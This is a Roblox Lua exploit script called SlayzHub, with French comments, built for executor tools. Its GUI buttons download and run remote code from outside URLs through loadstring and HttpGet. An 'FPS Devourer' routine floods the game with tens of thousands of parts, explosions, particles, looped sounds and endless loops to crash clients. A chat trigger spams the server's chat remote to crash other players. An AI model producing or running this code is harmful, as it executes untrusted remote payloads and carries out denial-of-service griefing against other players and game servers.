-- SLAYZHUB XENO GO v4.1 🔥 PREMIUM + FPS DEVOURER v5.0
-- Compatible Xeno, Solara, Fluxus, etc.

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SlayzHub"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999999

-- MainFrame avec dégradé violet/noir
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 550, 0, 450)
MainFrame.Position = UDim2.new(0.5, -275, 0.5, -225)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = MainFrame

-- Dégradé moderne violet/noir
local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 28, 135)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(45, 15, 75)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 40))
}
Gradient.Rotation = 45
Gradient.Parent = MainFrame

-- TitleBar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundColor3 = Color3.fromRGB(35, 20, 60)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 15)
TitleCorner.Parent = TitleBar

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 50, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 30, 200))
}
TitleGradient.Rotation = 90
TitleGradient.Parent = TitleBar

-- SLAYZHUB TITLE
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0, 250, 1, 0)
TitleLabel.Position = UDim2.new(0, 20, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔥 SLAYZHUB PREMIUM v4.1"
TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextStrokeTransparency = 0.7
TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.Parent = TitleBar

-- Close Button
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 40, 0, 40)
CloseButton.Position = UDim2.new(1, -50, 0.5, -20)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Text = "✕"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 10)
CloseCorner.Parent = CloseButton

-- Tab Buttons Frame
local TabFrame = Instance.new("Frame")
TabFrame.Size = UDim2.new(1, -40, 0, 50)
TabFrame.Position = UDim2.new(0, 20, 0, 70)
TabFrame.BackgroundTransparency = 1
TabFrame.Parent = MainFrame

-- Onglet PREMIUM (actif par défaut)
local PremiumTab = Instance.new("TextButton")
PremiumTab.Size = UDim2.new(0, 120, 1, 0)
PremiumTab.Position = UDim2.new(0, 0, 0, 0)
PremiumTab.BackgroundColor3 = Color3.fromRGB(120, 60, 200)
PremiumTab.Text = "💎 PREMIUM"
PremiumTab.TextColor3 = Color3.new(1, 1, 1)
PremiumTab.TextScaled = true
PremiumTab.Font = Enum.Font.GothamBold
PremiumTab.Parent = TabFrame

local PremiumTabCorner = Instance.new("UICorner")
PremiumTabCorner.CornerRadius = UDim.new(0, 10)
PremiumTabCorner.Parent = PremiumTab

-- Content Frame
local ContentFrame = Instance.new("Frame")
ContentFrame.Size = UDim2.new(1, -40, 1, -140)
ContentFrame.Position = UDim2.new(0, 20, 0, 130)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- Premium Content
local PremiumContent = Instance.new("Frame")
PremiumContent.Size = UDim2.new(1, 0, 1, 0)
PremiumContent.BackgroundTransparency = 1
PremiumContent.Parent = ContentFrame
PremiumContent.Visible = true

-- Boutons Premium Grid
local ListLayout = Instance.new("UIGridLayout")
ListLayout.CellSize = UDim2.new(0.48, -10, 0, 65)
ListLayout.CellPadding = UDim2.new(0, 10, 0, 12)
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Parent = PremiumContent

-- Bouton INSTANT TP
local InstantTP = Instance.new("TextButton")
InstantTP.Name = "InstantTP"
InstantTP.BackgroundColor3 = Color3.fromRGB(60, 180, 255)
InstantTP.Text = "⚡ INSTANT TP"
InstantTP.TextColor3 = Color3.new(1, 1, 1)
InstantTP.TextScaled = true
InstantTP.Font = Enum.Font.GothamBold
InstantTP.Parent = PremiumContent

local InstantTPCorner = Instance.new("UICorner")
InstantTPCorner.CornerRadius = UDim.new(0, 12)
InstantTPCorner.Parent = InstantTP

local InstantTPGradient = Instance.new("UIGradient")
InstantTPGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 140, 220))
}
InstantTPGradient.Parent = InstantTP

-- Bouton Nameless
local Nameless = Instance.new("TextButton")
Nameless.Name = "Nameless"
Nameless.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
Nameless.Text = "👻 NAMELESS"
Nameless.TextColor3 = Color3.new(1, 1, 1)
Nameless.TextScaled = true
Nameless.Font = Enum.Font.GothamBold
Nameless.Parent = PremiumContent

local NamelessCorner = Instance.new("UICorner")
NamelessCorner.CornerRadius = UDim.new(0, 12)
NamelessCorner.Parent = Nameless

local NamelessGradient = Instance.new("UIGradient")
NamelessGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 170)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 60, 120))
}
NamelessGradient.Parent = Nameless

-- Bouton Auto-Block
local AutoBlock = Instance.new("TextButton")
AutoBlock.Name = "AutoBlock"
AutoBlock.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
AutoBlock.Text = "🛡️ AUTO-BLOCK"
AutoBlock.TextColor3 = Color3.new(1, 1, 1)
AutoBlock.TextScaled = true
AutoBlock.Font = Enum.Font.GothamBold
AutoBlock.Parent = PremiumContent

local AutoBlockCorner = Instance.new("UICorner")
AutoBlockCorner.CornerRadius = UDim.new(0, 12)
AutoBlockCorner.Parent = AutoBlock

local AutoBlockGradient = Instance.new("UIGradient")
AutoBlockGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 255, 120)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 220, 60))
}
AutoBlockGradient.Parent = AutoBlock

-- Bouton FPS DEVOURER 🔥💀
local FPSDevourer = Instance.new("TextButton")
FPSDevourer.Name = "FPSDevourer"
FPSDevourer.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
FPSDevourer.Text = "💀 FPS DEVOURER"
FPSDevourer.TextColor3 = Color3.new(1, 1, 1)
FPSDevourer.TextScaled = true
FPSDevourer.Font = Enum.Font.GothamBold
FPSDevourer.Parent = PremiumContent

local FPSDevourerCorner = Instance.new("UICorner")
FPSDevourerCorner.CornerRadius = UDim.new(0, 12)
FPSDevourerCorner.Parent = FPSDevourer

local FPSDevourerGradient = Instance.new("UIGradient")
FPSDevourerGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 60, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 20, 20))
}
FPSDevourerGradient.Parent = FPSDevourer

-- Animations Hover
local function addHoverEffect(button)
    local originalSize = button.Size
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0.48, 0, 0, 70)}):Play()
    end)
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {Size = ListLayout.CellSize}):Play()
    end)
end

addHoverEffect(InstantTP)
addHoverEffect(Nameless)
addHoverEffect(AutoBlock)
addHoverEffect(FPSDevourer)

-- Click Events
InstantTP.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/3e58fa5b69bab3b3"))()
end)

Nameless.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
end)

AutoBlock.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"))()
end)

-- FPS DEVOURER v5.0 - ULTRA FPS KILLER (<5 FPS GARANTI)
FPSDevourer.MouseButton1Click:Connect(function()
    FPSDevourer.Text = "💀 FPS <5 ACTIVÉ..."
    FPSDevourer.TextColor3 = Color3.new(1, 0, 0)
    
    -- === PHASE 1: 50K PARTS PHYSICS EXPLOSIVES ===
    spawn(function()
        for i = 1, 50000 do
            local part = Instance.new("Part")
            part.Name = "FPSKiller" .. i
            part.Size = Vector3.new(math.random(1,5), math.random(1,5), math.random(1,5))
            part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(
                math.random(-500,500), math.random(100,1000), math.random(-500,500)
            )
            part.Anchored = false
            part.CanCollide = true
            part.Material = Enum.Material.Neon
            part.BrickColor = BrickColor.Random()
            part.Parent = workspace
            
            -- PHYSICS INSANE
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            bv.Velocity = Vector3.new(math.random(-200,200), math.random(100,500), math.random(-200,200))
            bv.Parent = part
            
            local ba = Instance.new("BodyAngularVelocity")
            ba.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
            ba.AngularVelocity = Vector3.new(math.random(-500,500), math.random(-500,500), math.random(-500,500))
            ba.Parent = part
            
            -- EXPLOSION CHAIN REACTION
            spawn(function()
                wait(math.random(1,10)/10)
                local explosion = Instance.new("Explosion")
                explosion.Position = part.Position
                explosion.BlastRadius = 50
                explosion.BlastPressure = 1e6
                explosion.Parent = workspace
            end)
        end
    end)
    
    -- === PHASE 2: 10K PARTICLE EMITTERS NON-STOP ===
    spawn(function()
        for i = 1, 10000 do
            pcall(function()
                local folder = Instance.new("Folder")
                folder.Name = "ParticleHell" .. i
                folder.Parent = workspace
                
                for j = 1, 50 do
                    local attachment = Instance.new("Attachment")
                    attachment.Parent = folder
                    
                    local particles = Instance.new("ParticleEmitter")
                    particles.Parent = attachment
                    particles.Texture = "rbxassetid://241650934"
                    particles.Rate = 5000
                    particles.Lifetime = NumberRange.new(0.3, 2)
                    particles.Speed = NumberRange.new(100, 300)
                    particles.SpreadAngle = Vector2.new(360, 360)
                    particles.Acceleration = Vector3.new(0, -50, 0)
                    particles.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)))
                    }
                end
            end)
        end
    end)
    
    -- === PHASE 3: SOUND HELL (1000+ SOUNDS) ===
    spawn(function()
        local soundIds = {
            "131961136", "131961136", "131961136", -- Airhorn spam
            "1842613988", "1842613988", -- Anime screams
            "1839246711", "1839246711"  -- Loud booms
        }
        for i = 1, 1000 do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://" .. soundIds[math.random(1, #soundIds)]
            sound.Volume = 10
            sound.Looped = true
            sound.RollOffMode = Enum.RollOffMode.Linear
            sound.Parent = workspace
            sound:Play()
            
            -- Change pitch randomly pour chaos audio max
            spawn(function()
                while sound.Parent do
                    sound.Pitch = math.random(5, 20)/10
                    sound.Volume = math.random(5, 15)
                    wait(0.1)
                end
            end)
        end
    end)
    
    -- === PHASE 4: RENDER STEALER INFINI ===
    spawn(function()
        local connections = {}
        while true do
            -- 1000+ lights qui bougent
            for i = 1, 1000 do
                pcall(function()
                    local light = Instance.new("PointLight")
                    light.Brightness = 10
                    light.Range = 50
                    light.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                    light.Parent = workspace:FindFirstChildOfClass("Part") or workspace.Terrain
                    
                    spawn(function()
                        while light.Parent do
                            light.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                            light.Range = math.random(20, 100)
                            wait(0.05)
                        end
                    end)
                end)
            end
            
            -- GUI SPAM (bloque render)
            for i = 1, 500 do
                local gui = Instance.new("Frame")
                gui.Size = UDim2.new(1,0,1,0)
                gui.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                gui.Parent = playerGui
                spawn(function()
                    for j = 1, 100 do
                        gui.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                        wait(0.01)
                    end
                    gui:Destroy()
                end)
            end
            
            wait(0.01)
        end
    end)
    
    -- === PHASE 5: WORKSPACE FLOOD ===
    spawn(function()
        while true do
            for i = 1, 200 do
                local model = Instance.new("Model")
                model.Name = "ChaosModel" .. tick()
                model.Parent = workspace
                
                for j = 1, 20 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(2,2,2)
                    part.Position = Vector3.new(math.random(-1000,1000), math.random(0,1000), math.random(-1000,1000))
                    part.Parent = model
                end
            end
            wait(0.1)
        end
    end)
    
    print("💀 FPS DEVOURER v5.0 ACTIVÉ - FPS < 5 GARANTI!")
end)

-- GOODBOYY CHAT CRASH SYSTEM
local crashActivated = false
Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == "goodboyy" and not crashActivated then
        crashActivated = true
        print("🔥 GOODBOYY ACTIVATED - CRASHING EVERYONE USING SCRIPT!")
        
        -- Détecte tous les joueurs avec SlayzHub
        spawn(function()
            while true do
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= player and plr:FindFirstChild("PlayerGui") then
                        pcall(function()
                            -- Force crash via massive replication
                            for i = 1, 1000 do
                                local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                if remote then
                                    remote.SayMessageRequest:FireServer("goodboyy", "All")
                                end
                            end
                        end)
                    end
                end
                wait(0.01)
            end
        end)
    end
end)

-- Close Button
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Draggable
local dragging = false
local dragStart = nil
local startPos = nil

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Entrée en scène
MainFrame.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
    Size = UDim2.new(0, 550, 0, 450)
}):Play()

print("🔥 SLAYZHUB v4.1 LOADED!")
print("💀 Tape 'goodboyy' dans le chat pour CRASH tout le monde!")
